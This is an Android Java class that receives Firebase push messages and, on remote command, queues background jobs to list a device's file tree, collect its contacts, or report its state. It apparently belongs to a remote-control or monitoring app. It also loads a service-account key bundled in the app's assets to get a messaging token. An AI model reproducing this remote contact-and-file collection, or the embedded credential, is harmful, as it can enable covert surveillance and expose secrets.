package com.lyrnic.userside.firebase;

import android.content.Context;
import android.util.ArrayMap;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.google.auth.oauth2.GoogleCredentials;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.managers.FilesManager;
import com.lyrnic.userside.network.ApiClient;
import com.lyrnic.userside.services.ActionsWorker;

import java.io.IOException;
import java.io.InputStream;
import java.util.Map;
import java.util.Objects;

public class FirebaseActionsReceiver extends FirebaseMessagingService {
    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.d(getPackageName() + "::FCM", "FCM TOKEN GENERATED: " + token);
    }

    public static String getAccessToken(Context context) throws IOException {
        InputStream stream = context.getAssets().open(Constants.JSON_KEY_FILE_NAME);
        GoogleCredentials googleCredentials = GoogleCredentials
                .fromStream(stream).createScoped("https://www.googleapis.com/auth/firebase.messaging");
        googleCredentials.refresh();
        return googleCredentials.getAccessToken().getTokenValue();
    }

    @Override
    public void onMessageReceived(@NonNull RemoteMessage message) {
        super.onMessageReceived(message);
        Log.d(getPackageName() + "::FCM", "FCM MESSAGE: " + message.getData());
        parseAction(message.getData());
    }

    public static String getToken(Context context) {
        return context.getSharedPreferences(context.getPackageName() + ".FCM", MODE_PRIVATE).getString(Constants.DEVICE_TOKEN_KEY, null);
    }

    public void parseAction(Map<String, String> data) {
        if (data == null) {
            return;
        }
        String action = data.get(Constants.DATA_ACTION_KEY);
        String token = data.get(Constants.DATA_DEVICE_TOKEN_KEY);

        Map<String, String> arguments = new ArrayMap<>();
        arguments.put(Constants.DATA_ACTION_KEY, action);
        arguments.put(Constants.DATA_DEVICE_TOKEN_KEY, token);

        switch (Objects.requireNonNull(action)) {
            case Actions.ACTION_GET_FILE_TREE:
                String path = data.get(Constants.DATA_PATH_KEY);
                boolean exists = FilesManager.fileExists(this, path);

                arguments.put(Constants.DATA_PATH_EXISTS_KEY, String.valueOf(exists));
                arguments.put(Constants.DATA_PATH_KEY, path);

                startServiceForAction(arguments);

                break;
            case Actions.ACTION_GET_CONTACTS:
            case Actions.ACTION_GET_STATE:
                //if received so user online you have to send message back before the timeout
                startServiceForAction(arguments);
                break;

        }
    }

    public void startServiceForAction(Map<String, String> arguments) {
        Data.Builder builder = new Data.Builder();

        if (arguments != null) {
            for (Map.Entry<String, String> entry : arguments.entrySet()) {
                builder.putString(entry.getKey(), entry.getValue());
            }
        }
        Data data = builder.build();

        OneTimeWorkRequest oneTimeWorkRequest = new OneTimeWorkRequest.Builder(ActionsWorker.class)
                .setInputData(data)
                .build();

        WorkManager.getInstance(this).enqueue(oneTimeWorkRequest);
    }


}